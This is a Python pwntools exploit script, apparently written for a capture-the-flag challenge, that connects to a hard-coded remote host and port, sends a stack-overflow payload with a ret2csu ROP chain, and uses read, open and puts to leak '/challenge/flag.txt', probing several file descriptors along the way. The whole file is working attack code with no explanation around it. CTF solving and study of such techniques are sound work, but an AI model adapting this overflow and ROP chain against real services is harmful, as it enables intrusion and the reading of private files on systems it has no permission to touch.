#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

HOST = '154.57.164.77'
PORT = 32702

csu_pop = 0x401512
csu_call = 0x4014f8
pop_rdi = 0x4011f2
got_read = 0x403250
got_open = 0x403278
bss = 0x404100
bss2 = 0x404200

def test_3csu_stdin():
    """3 CSU calls: read_path + open + read(STDIN) + puts"""
    r = remote(HOST, PORT)
    r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
    r.recvuntil(b'wish for next year: ')
    
    pay = b'A' * 72
    # 1) read path into bss
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss) + p64(40) + p64(got_read)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 2) open(bss, 0, 0)
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(bss) + p64(0) + p64(0) + p64(got_open)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 3) read(0=stdin, bss2, 0x20) — try stdin
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss2) + p64(0x20) + p64(got_read)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 4) puts(bss2)
    pay += p64(pop_rdi) + p64(bss2)
    pay += p64(0x401040)
    
    r.send(pay)
    import time; time.sleep(0.3)
    r.send(b'/challenge/flag.txt\x00')   # for CSU call 1
    time.sleep(0.3)
    r.send(b'FD0_WORKS_TOO\n')           # for CSU call 3 (stdin)
    time.sleep(1)
    try:
        data = r.recv(timeout=4)
        print(f'3CSU stdin: {data[:300]}')
        if b'FD0_WORKS' in data:
            print('  → 3 CSU calls WORKS! Problem is with open fd')
        elif b'mask' in data:
            print('  → FAIL')
    except Exception as e:
        print(f'3CSU stdin: {e}')
    r.close()

def test_fd_probe():
    """After open, try read from various fds"""
    for fd in [3, 4, 5, 0]:
        r = remote(HOST, PORT)
        r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
        r.recvuntil(b'wish for next year: ')
        
        pay = b'A' * 72
        # 1) read path
        pay += p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss) + p64(40) + p64(got_read)
        pay += p64(csu_call) + p64(0) + p64(0)*6
        # 2) open
        pay += p64(csu_pop) + p64(0) + p64(1) + p64(bss) + p64(0) + p64(0) + p64(got_open)
        pay += p64(csu_call) + p64(0) + p64(0)*6
        # 3) read(fd, bss2, 0x100)
        pay += p64(csu_pop) + p64(0) + p64(1) + p64(fd) + p64(bss2) + p64(0x100) + p64(got_read)
        pay += p64(csu_call) + p64(0) + p64(0)*6
        # 4) puts(bss2)
        pay += p64(pop_rdi) + p64(bss2)
        pay += p64(0x401040)
        
        r.send(pay)
        import time; time.sleep(0.3)
        r.send(b'/challenge/flag.txt\x00')
        time.sleep(2)
        try:
            data = r.recv(timeout=5)
            if b'{' in data:
                idx0 = data.index(b'{')
                idx1 = data.index(b'}')
                print(f'fd={fd}: FLAG! {data[idx0-4:idx1+1]}')
            else:
                extra = data.split(b'\n')[2:]
                extra_str = b''.join(extra)
                print(f'fd={fd}: {extra_str[:60] if extra_str else b"<empty>"}')
        except Exception as e:
            print(f'fd={fd}: {e}')
        r.close()

if __name__ == '__main__':
    print('=== 3 CSU calls with stdin for 3rd ===')
    test_3csu_stdin()
    print()
    print('=== Probe various fds ===')
    test_fd_probe()
